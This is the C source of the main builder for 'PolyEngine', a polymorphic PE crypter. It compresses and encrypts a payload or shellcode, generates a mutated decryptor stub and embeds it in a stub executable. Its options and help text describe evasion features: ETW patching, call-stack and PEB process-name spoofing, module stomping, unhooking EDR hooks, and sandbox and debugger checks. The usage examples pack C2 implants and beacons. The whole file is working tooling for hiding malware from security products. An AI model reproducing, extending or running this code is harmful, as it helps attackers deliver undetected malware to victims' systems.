/*
 * ==========================================================================
 *  Builder.cpp – Main entry point of the PolyEngine
 * ==========================================================================
 *
 *  This program creates polymorphic PE applications. It's just a packer.
 *  Steps:
 *  1. Reads input file (target payload PE).
 *  2. Compresses it with LZNT1 to minimize the footprint.
 *  3. Encrypts the data using a multi-stage byte-per-byte substitution.
 *  4. Generates a mutated, polymorphic decryptor stub in memory.
 *  5. Embeds the package into the .rsrc section of a blank Stub.exe 
 *     using Win32 Resource APIs (BeginUpdateResource/UpdateResource).
 *  =========================================================================
 */

#include <Windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

/* Our modules */
#include "..\Engine\Crypto.h"
#include "..\Engine\Compression.h"
#include "..\Engine\PeBuilder.h"
#include "..\Engine\MutationEngine.h"
#include "..\Engine\Xtea.h"
#include "..\Engine\OpsecFlags.h"

#pragma comment(lib, "Crypt32.lib")

/* Djb2 with caller-supplied seed — seed is key_salt[0] (per-build CryptGenRandom).
 * Eliminates the fixed 0xDEADC0DE constant from both Builder and stub.bin. */
static DWORD BuilderDjb2A(const char* s, DWORD seed) {
    DWORD h = seed;
    int   c;
    if (!s) return 0;
    while ((c = *s++)) h = ((h << 5) + h) + c;
    return h;
}

/* Pool of System32 process names used for PEB spoofing when --spoof-name is not specified. */
static const char* kSpoofPool[] = {
    "RuntimeBroker.exe",   /* UWP runtime broker — always running on modern Windows */
    "SgrmBroker.exe",      /* System Guard Runtime Monitor Broker                   */
    "WmiPrvSE.exe",        /* WMI Provider Host — very common background process    */
    "SearchIndexer.exe",   /* Windows Search Indexer                                */
    "taskhostw.exe",       /* Task Host Window — hosts background scheduled tasks   */
    "spoolsv.exe",         /* Print Spooler                                         */
    "wlrmdr.exe",          /* Windows Logon Reminder                                */
    "WMPDMC.exe",          /* Windows Media Player Device Manager Component         */
    "hvix64.exe",          /* Hyper-V Intel x64 Microkernel                        */
};
#define SPOOF_POOL_SIZE 9

/* ── --disable token lookup table ──────────────────────────────────────────
 *
 *  Single source of truth: every --disable token, the opsecFlags bit it sets,
 *  the help group it belongs to, and the help-text shown in --help all live
 *  in this one table.  Adding a new token = one line here.  The parser, the
 *  unknown-token error message, and the usage printer all iterate this array.
 *
 *  "all" is handled separately: it ORs every entry plus EVASION_FLAG_NO_ALL
 *  (fast-exit shortcut in Evasion_RunChecks).
 *
 *  Tokens are matched case-insensitively.  Multiple tokens may appear in one
 *  --disable argument separated by commas (e.g. --disable etw,peb,cpu),
 *  and --disable may be repeated on the command line.
 * ------------------------------------------------------------------------- */
typedef enum {
    DGROUP_OPSEC,
    DGROUP_SANDBOX,
} DISABLE_GROUP;

typedef struct {
    const char*   name;
    DWORD         flag;
    DISABLE_GROUP group;
    const char*   help;
} DISABLE_ENTRY;

static const DISABLE_ENTRY kDisableMap[] = {
    /* OPSEC technique disable */
    { "etw",       OPSEC_FLAG_NO_ETW,           DGROUP_OPSEC,   "EtwEventWrite patch (ETW telemetry)" },
    { "spoofing",  OPSEC_FLAG_NO_CALLSTACK,     DGROUP_OPSEC,   "Call-stack spoofing (SilentMoonwalk RSP pivot)" },
    { "peb",       OPSEC_FLAG_NO_PEB,           DGROUP_OPSEC,   "PEB path/cmdline spoof" },
    { "tls",       OPSEC_FLAG_NO_TLS,           DGROUP_OPSEC,   "TLS anti-debug callback" },
    /* Evasion check disable */
    { "hammer",    EVASION_FLAG_NO_HAMMER,      DGROUP_SANDBOX, "API-hammer timing delay (VirtualAlloc/Free loop)" },
    { "debugger",  EVASION_FLAG_NO_DEBUGGER,    DGROUP_SANDBOX, "Debugger detection (PEB flags / NtQueryInformationProcess)" },
    { "api-emu",   EVASION_FLAG_NO_API_EMU,     DGROUP_SANDBOX, "API emulation probe (RtlComputeCrc32 identity check)" },
    { "exec-ctrl", EVASION_FLAG_NO_EXEC_CTRL,   DGROUP_SANDBOX, "Execution-control semaphore (re-execution detection)" },
    { "sleep-fwd", EVASION_FLAG_NO_SLEEP_FWD,   DGROUP_SANDBOX, "Sleep-forwarding detection (timing)" },
    { "uptime",    EVASION_FLAG_NO_UPTIME,      DGROUP_SANDBOX, "System uptime check" },
    { "cpu",       EVASION_FLAG_NO_CPU_COUNT,   DGROUP_SANDBOX, "CPU count check (< 2 logical cores)" },
    { "screen",    EVASION_FLAG_NO_SCREEN_RES,  DGROUP_SANDBOX, "Screen resolution check (<= 1024 px width)" },
    { "files",     EVASION_FLAG_NO_RECENT_FILES,DGROUP_SANDBOX, "Recent-files count check (< 5 RecentDocs subkeys)" },
    { NULL, 0, DGROUP_OPSEC, NULL }
};

/* Prints "    name        help" lines for every entry whose group matches.
 * Used by PrintUsage to render OPSEC and Sandbox blocks from the same table. */
static void PrintDisableGroup(DISABLE_GROUP group) {
    for (int k = 0; kDisableMap[k].name; k++) {
        if (kDisableMap[k].group == group) {
            printf("    %-11s %s\n", kDisableMap[k].name, kDisableMap[k].help);
        }
    }
}

/* Prints the comma-separated list of valid token names (used in error message). */
static void PrintDisableTokens(void) {
    for (int k = 0; kDisableMap[k].name; k++) {
        printf("%s%s", (k > 0 ? " " : ""), kDisableMap[k].name);
    }
    printf(" all");
}

/* Parses a comma-separated list of disable tokens and ORs the corresponding
 * flags into *pFlags.  "all" disables every entry plus EVASION_FLAG_NO_ALL.
 * Returns FALSE and prints an error if an unknown token is encountered. */
static BOOL ApplyDisableList(const char* list, DWORD* pFlags) {
    char buf[256];
    strncpy_s(buf, sizeof(buf), list, _TRUNCATE);
    char* ctx = NULL;
    char* tok = strtok_s(buf, ",", &ctx);
    while (tok) {
        while (*tok == ' ') tok++;  /* trim leading spaces */

        if (_stricmp(tok, "all") == 0) {
            for (int k = 0; kDisableMap[k].name; k++)
                *pFlags |= kDisableMap[k].flag;
            *pFlags |= EVASION_FLAG_NO_ALL;
        } else {
            BOOL found = FALSE;
            for (int k = 0; kDisableMap[k].name; k++) {
                if (_stricmp(tok, kDisableMap[k].name) == 0) {
                    *pFlags |= kDisableMap[k].flag;
                    found = TRUE;
                    break;
                }
            }
            if (!found) {
                printf("[!] Unknown --disable token: \"%s\"\n", tok);
                printf("    Valid tokens: ");
                PrintDisableTokens();
                printf("\n");
                return FALSE;
            }
        }
        tok = strtok_s(NULL, ",", &ctx);
    }
    return TRUE;
}

/* -------------------------------------------------------------------------
 *  BUILD_CONFIG — every CLI-parsed parameter that flows into BuildInfectedPE
 *  Filled by ParseArgs.  Defaults set by BuildConfig_Defaults.
 * ------------------------------------------------------------------------- */
typedef struct {
    const char* targetPath;       /* argv[1]  — input PE/shellcode               */
    const char* outputPath;       /* argv[2]  — output exe                        */
    const char* stubPath;         /* --stub   — default: "stub.bin"               */
    BYTE        dll_indices[3];   /* --preset — default: PRINT (0, 1, 2)          */
    char        exportName[64];   /* --export — raw name, hashed post-parse       */
    char        exportArg[128];   /* --arg    — passed to export at runtime       */
    char        spoofExe[64];     /* --spoof-name — empty = random from pool      */
    char        semaphoreName[32];/* --exec-ctrl-name — empty = use default       */
    DWORD       sleepFwdMs;       /* --sleep-fwd-ms   — 0 = use default 500 ms    */
    DWORD       uptimeMin;        /* --uptime-min     — 0 = use default 2 min     */
    DWORD       hammerMs;         /* --hammer-s       — 0 = use default 3000 ms   */
    DWORD       opsecFlags;       /* --disable / --overload / --keep-alive / --unhook */
} BUILD_CONFIG;

static void BuildConfig_Defaults(BUILD_CONFIG* cfg) {
    cfg->targetPath       = NULL;
    cfg->outputPath       = NULL;
    cfg->stubPath         = "stub.bin";
    cfg->dll_indices[0]   = 0;  /* PRINT preset */
    cfg->dll_indices[1]   = 1;
    cfg->dll_indices[2]   = 2;
    cfg->exportName[0]    = '\0';
    cfg->exportArg[0]     = '\0';
    cfg->spoofExe[0]      = '\0';
    cfg->semaphoreName[0] = '\0';
    cfg->sleepFwdMs       = 0;
    cfg->uptimeMin        = 0;
    cfg->hammerMs         = 0;
    cfg->opsecFlags       = 0;
}

/* -------------------------------------------------------------------------
 *  ParseArgs — minimal CLI argument parser
 *  Returns FALSE on bad/missing arguments; caller prints usage.
 * ------------------------------------------------------------------------- */
static BOOL ParseArgs(int argc, char* argv[], BUILD_CONFIG* cfg) {
    if (argc < 3) return FALSE;

    cfg->targetPath = argv[1];
    cfg->outputPath = argv[2];

    for (int i = 3; i < argc; i++) {
        if (_stricmp(argv[i], "--stub") == 0 && i + 1 < argc) {
            cfg->stubPath = argv[++i];
        }
        else if (_stricmp(argv[i], "--preset") == 0 && i + 1 < argc) {
            const char* preset = argv[++i];
            if (_stricmp(preset, "PRINT") == 0) {
                cfg->dll_indices[0] = 0; cfg->dll_indices[1] = 1; cfg->dll_indices[2] = 2;
            } else if (_stricmp(preset, "MEDIA") == 0) {
                cfg->dll_indices[0] = 3; cfg->dll_indices[1] = 4; cfg->dll_indices[2] = 5;
            } else if (_stricmp(preset, "NETWORK") == 0) {
                cfg->dll_indices[0] = 6; cfg->dll_indices[1] = 7; cfg->dll_indices[2] = 8;
            } else if (_stricmp(preset, "RANDOM") == 0) {
                /* CryptGenRandom fills a byte for each index, then mod 10 */
                HCRYPTPROV hProv = 0;
                BYTE rnd[3] = { 0 };
                if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                    CryptGenRandom(hProv, 3, rnd);
                    CryptReleaseContext(hProv, 0);
                }
                cfg->dll_indices[0] = rnd[0] % 10;
                cfg->dll_indices[1] = rnd[1] % 10;
                cfg->dll_indices[2] = rnd[2] % 10;
            } else {
                printf("[!] Unknown preset: %s  (valid: PRINT, MEDIA, NETWORK, RANDOM)\n", preset);
                return FALSE;
            }
        }
        else if (_stricmp(argv[i], "--export") == 0 && i + 1 < argc) {
            /* Store raw name — hash computed after key_salt is known */
            strncpy_s(cfg->exportName, sizeof(cfg->exportName), argv[++i], sizeof(cfg->exportName) - 1);
            cfg->exportName[sizeof(cfg->exportName) - 1] = '\0';
        }
        else if (_stricmp(argv[i], "--arg") == 0 && i + 1 < argc) {
            strncpy_s(cfg->exportArg, sizeof(cfg->exportArg), argv[++i], sizeof(cfg->exportArg) - 1);
            cfg->exportArg[sizeof(cfg->exportArg) - 1] = '\0';
        }
        else if (_stricmp(argv[i], "--spoof-name") == 0 && i + 1 < argc) {
            strncpy_s(cfg->spoofExe, sizeof(cfg->spoofExe), argv[++i], sizeof(cfg->spoofExe) - 1);
            cfg->spoofExe[sizeof(cfg->spoofExe) - 1] = '\0';
        }
        else if (_stricmp(argv[i], "--exec-ctrl-name") == 0 && i + 1 < argc) {
            strncpy_s(cfg->semaphoreName, sizeof(cfg->semaphoreName), argv[++i], sizeof(cfg->semaphoreName) - 1);
            cfg->semaphoreName[sizeof(cfg->semaphoreName) - 1] = '\0';
        }
        else if (_stricmp(argv[i], "--sleep-fwd-ms") == 0 && i + 1 < argc) {
            int v = atoi(argv[++i]);
            cfg->sleepFwdMs = (v > 0) ? (DWORD)v : 0;
        }
        else if (_stricmp(argv[i], "--uptime-min") == 0 && i + 1 < argc) {
            int v = atoi(argv[++i]);
            cfg->uptimeMin = (v > 0) ? (DWORD)v : 0;
        }
        else if (_stricmp(argv[i], "--hammer-s") == 0 && i + 1 < argc) {
            int v = atoi(argv[++i]);
            cfg->hammerMs = (v > 0) ? (DWORD)(v * 1000) : 0;
        }
        else if (_stricmp(argv[i], "--overload") == 0) {
            cfg->opsecFlags |= OPSEC_FLAG_MODULE_OVERLOAD;
        }
        else if (_stricmp(argv[i], "--keep-alive") == 0) {
            cfg->opsecFlags |= OPSEC_FLAG_KEEP_ALIVE;
        }
        else if (_stricmp(argv[i], "--unhook") == 0) {
            cfg->opsecFlags |= EVASION_FLAG_UNHOOK;
        }
        else if (_stricmp(argv[i], "--disable") == 0 && i + 1 < argc) {
            if (!ApplyDisableList(argv[++i], &cfg->opsecFlags)) return FALSE;
        }
        else {
            printf("[!] Unknown option: %s\n", argv[i]);
            return FALSE;
        }
    }
    return TRUE;
}

/* -------------------------------------------------------------------------
 *  PrintUsage — single source for help text.  --disable tokens come straight
 *  out of kDisableMap so this can never drift from the parser.
 * ------------------------------------------------------------------------- */
static void PrintUsage(void) {
    printf("Usage: Builder.exe <input> <output> [OPTIONS]\n");
    printf("\n");
    printf("  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)\n");
    printf("            Auto-detected from MZ header\n");
    printf("  <output>  Output executable\n");
    printf("\n");
    printf("Loader:\n");
    printf("  --stub <path>              Path to stub.bin  [default: ./stub.bin]\n");
    printf("  --preset PRINT|MEDIA|NETWORK|RANDOM\n");
    printf("                             Module stomping DLL preset  [default: PRINT]\n");
    printf("  --overload                 Module overloading instead of stomping\n");
    printf("                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)\n");
    printf("  --keep-alive               ExitThread(0) instead of ExitProcess\n");
    printf("                             (required for C2 implants that spawn their own threads)\n");
    printf("  --unhook                   Restore original .text bytes in ntdll/kernel32/kernelbase\n");
    printf("                             from \\KnownDlls\\ clean copies, overwriting EDR inline hooks\n");
    printf("\n");
    printf("Payload  (PE/DLL only, silently ignored for shellcode):\n");
    printf("  --export <name>            DLL export to invoke after DllMain\n");
    printf("  --arg <string>             Argument passed to the export  [max 127 chars]\n");
    printf("\n");
    printf("Evasion customization (all ON by default):\n");
    printf("  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]\n");
    printf("                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe\n");
    printf("                                   SearchIndexer.exe taskhostw.exe spoolsv.exe\n");
    printf("                                   wlrmdr.exe WMPDMC.exe hvix64.exe\n");
    printf("  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]\n");
    printf("                             (max 31 chars)\n");
    printf("  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]\n");
    printf("                             Detection threshold: 90%% of <ms> elapsed\n");
    printf("  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]\n");
    printf("  --hammer-s <seconds>       API-hammer delay duration  [default: 3]\n");
    printf("  --disable <token[,token]>  Disable one or more features (comma-separated, repeatable)\n");
    printf("\n");
    printf("  OPSEC tokens:\n");
    PrintDisableGroup(DGROUP_OPSEC);
    printf("\n");
    printf("  Sandbox/debug check tokens:\n");
    PrintDisableGroup(DGROUP_SANDBOX);
    printf("    %-11s %s\n", "all", "Disable every token listed above");
    printf("\n");
    printf("Examples:\n");
    printf("  Builder.exe implant.exe     packed.exe\n");
    printf("  Builder.exe shellcode.bin   packed.exe --keep-alive\n");
    printf("  Builder.exe beacon.dll      packed.exe --export Start --keep-alive\n");
    printf("  Builder.exe payload.dll     packed.exe --export Execute --arg \"calc.exe\"\n");
    printf("  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls\n");
}

int main(int argc, char* argv[]) {
  printf("=============================================\n");
  printf("# PolyEngine - Polymorphic Mutation Engine # \n");
  printf("#                PE Crypter                # \n");
  printf("#                                  By Razz # \n");
  printf("=============================================\n\n");

  BUILD_CONFIG cfg;
  BuildConfig_Defaults(&cfg);
  DWORD exportHash = 0;   /* derived post-parse from cfg.exportName + key_salt[0] */

  if (!ParseArgs(argc, argv, &cfg)) {
      PrintUsage();
      return 1;
  }

  /* If --spoof-name was not provided, pick a random entry from the pool. */
  if (cfg.spoofExe[0] == '\0') {
      HCRYPTPROV hProv = 0;
      BYTE rndByte = 0;
      if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
          CryptGenRandom(hProv, 1, &rndByte);
          CryptReleaseContext(hProv, 0);
      }
      const char* picked = kSpoofPool[rndByte % SPOOF_POOL_SIZE];
      strncpy_s(cfg.spoofExe, sizeof(cfg.spoofExe), picked, sizeof(cfg.spoofExe) - 1);
      printf("[*] PEB spoof process: %s (random)\n", cfg.spoofExe);
  } else {
      printf("[*] PEB spoof process: %s (user-specified)\n", cfg.spoofExe);
  }

  /* STEP 1: Initialization API */
  printf("[*] Phase 1: NTAPI & Compression Initialization...\n");
  if (!InitCompressionApi()) {
    fprintf(stderr, "[!] ERROR: Couldn't initialize Compression APIs.\n");
    return 1;
  }

  /* STEP 2: Generating Key for Payload */
  printf("[*] Phase 2: Compound Cipher Key Generation...\n");
  COMPOUND_KEY cipherKey;
  GenerateCompoundKey(&cipherKey);
  printf("[+] Key: key1=0x%02X rotBits=%d key3=0x%02X key4=0x%02X\n",
         cipherKey.key1, cipherKey.rotBits, cipherKey.key3, cipherKey.key4);

  /* STEP 3: Reading Target payload (PE or raw shellcode) */
  printf("[*] Phase 3: Reading target payload: %s\n", cfg.targetPath);
  BYTE* rawTargetBuffer = NULL;
  DWORD rawTargetSize = 0;
  if (!ReadFileToBuffer(cfg.targetPath, &rawTargetBuffer, &rawTargetSize)) {
      fprintf(stderr, "[!] ERROR: Failed to read target file.\n");
      return 1;
  }
  printf("[+] Target file loaded (%lu bytes)\n", rawTargetSize);

  /* Auto-detect: if first two bytes are not "MZ" treat as raw PIC shellcode.
   * The entire pipeline (compress → inner-encrypt → mutate → XTEA → .rsrc)
   * is identical for both formats — only the Stub execution path differs. */
  if (rawTargetSize >= 2 &&
      !(rawTargetBuffer[0] == 'M' && rawTargetBuffer[1] == 'Z')) {
      cfg.opsecFlags |= PAYLOAD_FLAG_IS_SHELLCODE;
      printf("[*] Payload type: raw shellcode (no MZ header) - stub will execute directly\n");
      /* --export / --arg are meaningless for shellcode; clear silently */
      exportHash       = 0;
      cfg.exportArg[0] = '\0';
  } else {
      printf("[*] Payload type: PE (MZ detected) - stub will use RunPE\n");
  }

  /* STEP 4: Compressing Target PE (LZNT1) */
  printf("[*] Phase 4: Compressing Target PE (LZNT1)...\n");
  BYTE* compressedBuffer = NULL;
  ULONG compressedSize = 0;
  if (!CompressPayload(rawTargetBuffer, rawTargetSize, &compressedBuffer, &compressedSize)) {
      fprintf(stderr, "[!] ERROR: Failed to compress payload.\n");
      SecureZeroMemory(rawTargetBuffer, rawTargetSize);
      HeapFree(GetProcessHeap(), 0, rawTargetBuffer);
      return 1;
  }
  printf("[+] Payload compressed: %lu -> %lu bytes\n", rawTargetSize, compressedSize);

  /* Zero and free the raw PE — the plaintext payload is no longer needed */
  SecureZeroMemory(rawTargetBuffer, rawTargetSize);
  HeapFree(GetProcessHeap(), 0, rawTargetBuffer);
  rawTargetBuffer = NULL;

  /* STEP 5: Encrypting payload */
  printf("[*] Phase 5: Encrypting payload...\n");
  CompoundEncrypt(compressedBuffer, compressedSize, &cipherKey);
  printf("[+] Payload encrypted successfully!\n");

  /* STEP 6: Decryptor Mutation — cipherKey must still be valid here so
   * MutateDecryptor can embed the correct decryption key into the stub.
   * Zero it only after mutation completes. */
  printf("[*] Phase 6: Decryptor Mutation...\n");
  MUTATED_SHELLCODE mutated = {0};
  if (!MutateDecryptor(compressedBuffer, compressedSize, &cipherKey, &mutated)) {
    fprintf(stderr, "[!] ERROR: MutateDecryptor failed\n");
    SecureZeroMemory(&cipherKey, sizeof(cipherKey));
    HeapFree(GetProcessHeap(), 0, compressedBuffer);
    return 1;
  }
  printf("[+] Mutation completed! Stub size: %zu bytes (Total: %zu)\n", mutated.stubSize, mutated.totalSize);

  /* Zero cipher key — key is now embedded in the mutated stub; no longer needed */
  SecureZeroMemory(&cipherKey, sizeof(cipherKey));

  /* STEP 7: Per-build XTEA key salt + outer encryption
   *
   * CryptGenRandom produces 16 random bytes (= 4 DWORDs) that are:
   *   1. XOR'd into the stack-constructed base key  →  unique XTEA key per build
   *   2. Stored plaintext in the .rsrc metadata block  →  Stub reads and applies them
   *
   * Without the salt every build would share the same XTEA key (stack construction
   * uses only fixed mathematical constants).  With the salt, an analyst must break
   * the key independently for each packed file. */
  printf("[*] Phase 7: Generating per-build XTEA key salt (CryptGenRandom)...\n");
  DWORD key_salt[4] = { 0 };
  {
      HCRYPTPROV hProv = 0;
      if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) ||
          !CryptGenRandom(hProv, sizeof(key_salt), (BYTE*)key_salt)) {
          fprintf(stderr, "[!] ERROR: CryptGenRandom failed for XTEA salt.\n");
          HeapFree(GetProcessHeap(), 0, mutated.pBuffer);
          HeapFree(GetProcessHeap(), 0, compressedBuffer);
          return 1;
      }
      CryptReleaseContext(hProv, 0);
  }

  /* Compute export hash NOW — uses key_salt[0] as the per-build seed.
   * This eliminates the fixed 0xDEADC0DE constant from both Builder and stub.bin.
   * Stub reads key_salt[0] from .rsrc (before zeroing) and passes it to RunPE(). */
  if (cfg.exportName[0] != '\0' && !(cfg.opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE)) {
      exportHash = BuilderDjb2A(cfg.exportName, key_salt[0]);
      printf("[+] Export hash: 0x%08X  (seed=key_salt[0]=0x%08X, name=\"%s\")\n",
             exportHash, key_salt[0], cfg.exportName);
  }
  SecureZeroMemory(cfg.exportName, sizeof(cfg.exportName));

  printf("[*] Phase 7b: XTEA outer encryption...\n");
  DWORD xteaKey[4];
  Xtea_DeriveKey(xteaKey, key_salt);
  Xtea_Crypt(mutated.pBuffer, mutated.totalSize, xteaKey);
  printf("[+] XTEA done - key: %08X %08X %08X %08X  salt: %08X %08X %08X %08X\n",
         xteaKey[0], xteaKey[1], xteaKey[2], xteaKey[3],
         key_salt[0], key_salt[1], key_salt[2], key_salt[3]);

  /* Zero XTEA key from stack — key_salt is still needed for BuildInfectedPE */
  SecureZeroMemory(xteaKey, sizeof(xteaKey));

  /* STEP 7c: Verify that at least one preset DLL has an executable section
   *           large enough to hold the final payload blob.
   *
   * This is a Builder-side sanity check only — Stub handles the failure
   * gracefully (tries the next DLL, returns NULL if all fail).  But the user
   * deserves a warning *before* shipping an exe that will silently crash.
   *
   * Implementation:
   *   - Mirror the same 10-DLL pool used by ModuleStomping.c.
   *   - For each of the 3 preset indices: LoadLibraryExA (DONT_RESOLVE_DLL_REFERENCES
   *     so we get a flat mapping with no side effects), walk PE sections, find the
   *     largest IMAGE_SCN_MEM_EXECUTE section, compare VirtualSize to totalSize.
   *   - FreeLibrary immediately after inspection.
   *   - If none of the three DLLs is large enough: print a prominent warning and
   *     suggest --preset RANDOM or a different preset. */
  {
      static const char* kDllPool[10] = {
          "xpsservices.dll",  /* 0 — PRINT   */
          "msi.dll",          /* 1 — PRINT   */
          "dbghelp.dll",      /* 2 — PRINT   */
          "winmm.dll",        /* 3 — MEDIA   */
          "dxgi.dll",         /* 4 — MEDIA   */
          "oleaut32.dll",     /* 5 — MEDIA   */
          "winhttp.dll",      /* 6 — NETWORK */
          "wtsapi32.dll",     /* 7 — NETWORK */
          "wlanapi.dll",      /* 8 — NETWORK */
          "bcrypt.dll",       /* 9 — CRYPTO  */
      };

      printf("[*] Phase 7c: Verifying preset DLL section sizes...\n");

      int anyFit = 0;
      for (int i = 0; i < 3; i++) {
          BYTE idx = cfg.dll_indices[i];
          if (idx >= 10) continue;

          const char* dllName = kDllPool[idx];
          /* DONT_RESOLVE_DLL_REFERENCES: flat file mapping, no DllMain, no imports */
          HMODULE hMod = LoadLibraryExA(dllName, NULL, DONT_RESOLVE_DLL_REFERENCES);
          if (!hMod) {
              printf("    [!] DLL[%d] %s: not found on this system (skipped)\n", idx, dllName);
              continue;
          }

          PBYTE pBase = (PBYTE)hMod;
          PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
          DWORD maxExecSize = 0;

          if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
              PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
              if (pNt->Signature == IMAGE_NT_SIGNATURE) {
                  PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
                  WORD nSec = pNt->FileHeader.NumberOfSections;
                  for (WORD s = 0; s < nSec; s++) {
                      if (pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                          if (pSec[s].Misc.VirtualSize > maxExecSize)
                              maxExecSize = pSec[s].Misc.VirtualSize;
                      }
                  }
              }
          }

          FreeLibrary(hMod);

          if (maxExecSize >= (DWORD)mutated.totalSize) {
              printf("    [+] DLL[%d] %-20s .text=%lu bytes  >= payload %zu bytes  OK\n",
                     idx, dllName, maxExecSize, mutated.totalSize);
              anyFit = 1;
          } else {
              printf("    [-] DLL[%d] %-20s .text=%lu bytes  <  payload %zu bytes  TOO SMALL\n",
                     idx, dllName, maxExecSize, mutated.totalSize);
          }
      }

      if (!anyFit) {
          fprintf(stderr,
              "\n[!] WARNING: None of the preset DLLs has an executable section large\n"
              "             enough for the payload (%zu bytes).\n"
              "             The packed exe will fail at runtime (exit code 33).\n"
              "             Try a different preset:  --preset MEDIA / NETWORK / RANDOM\n\n",
              mutated.totalSize);
		  /* Warning only — we still proceed with the build, Stub will handle the failure gracefully. */
      }
  }

  /* STEP 8: Building Final PE */
  printf("[*] Phase 8: Building Final PE...\n");
  printf("[*] Module-stomp preset: DLL pool indices [%u, %u, %u]\n",
         cfg.dll_indices[0], cfg.dll_indices[1], cfg.dll_indices[2]);
  if (BuildInfectedPE(cfg.stubPath, cfg.outputPath,
                      mutated.pBuffer, mutated.totalSize,
                      rawTargetSize, (DWORD)mutated.stubSize,
                      key_salt, cfg.dll_indices,
                      exportHash, cfg.exportArg,
                      cfg.spoofExe,
                      cfg.semaphoreName[0] ? cfg.semaphoreName : NULL,
                      cfg.sleepFwdMs,
                      cfg.uptimeMin,
                      cfg.hammerMs,
                      cfg.opsecFlags)) {
      printf("\n[+] === You're good to go! Build finished. ===\n");
      printf("[+] Saved as: %s\n", cfg.outputPath);
  } else {
      fprintf(stderr, "\n[!] === Build failed. ===\n");
  }

  /* Zero key_salt after BuildInfectedPE — it has been embedded in .rsrc */
  SecureZeroMemory(key_salt, sizeof(key_salt));

  /* Cleanup — zero sensitive buffers before freeing */
  if (mutated.pBuffer) {
      SecureZeroMemory(mutated.pBuffer, mutated.totalSize);
      HeapFree(GetProcessHeap(), 0, mutated.pBuffer);
  }
  if (compressedBuffer) {
      SecureZeroMemory(compressedBuffer, compressedSize);
      HeapFree(GetProcessHeap(), 0, compressedBuffer);
  }

  return 0;
}
